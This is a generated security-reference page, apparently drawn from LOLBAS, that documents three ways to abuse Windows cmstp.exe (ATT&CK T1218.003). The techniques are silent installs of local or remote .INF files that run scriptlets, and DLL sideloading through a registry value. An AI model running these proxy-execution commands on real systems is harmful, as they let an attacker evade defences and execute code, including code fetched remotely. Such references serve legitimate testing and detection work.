---
parsed_by: focuslocust
source: commands
type: generated
---
# Cmstp Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Cmstp.exe

Tool page: [Cmstp.exe](../../tools/windows/cmstp.exe.md)

### Execute code hidden within an inf file. Download and run scriptlets from internet.

```text
cmstp.exe /ni /s {PATH_ABSOLUTE:.inf}
```

Description:

Silently installs a specially formatted local .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.

Related ATT&CK:

- [T1218.003](../../attack/techniques/T1218.003-cmstp.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Cmstp.yml` |
| Evidence | Command preserved from source parser. |

### Execute code hidden within an inf file. Execute code directly from Internet.

```text
cmstp.exe /ni /s {REMOTEURL:.inf}
```

Description:

Silently installs a specially formatted remote .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.

Related ATT&CK:

- [T1218.003](../../attack/techniques/T1218.003-cmstp.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Cmstp.yml` |
| Evidence | Command preserved from source parser. |

### Proxy execution of a malicious DLL via registry modification.

```text
cmstp.exe /nf
```

Description:

cmstp.exe reads the `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\cmmgr32.exe\CmstpExtensionDll` registry value and passes its data directly to `LoadLibrary`. By modifying this registry key and setting it to an attack-controlled DLL, this will sideload the DLL via `cmstp.exe`.

Related ATT&CK:

- [T1218.003](../../attack/techniques/T1218.003-cmstp.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Cmstp.yml` |
| Evidence | Command preserved from source parser. |
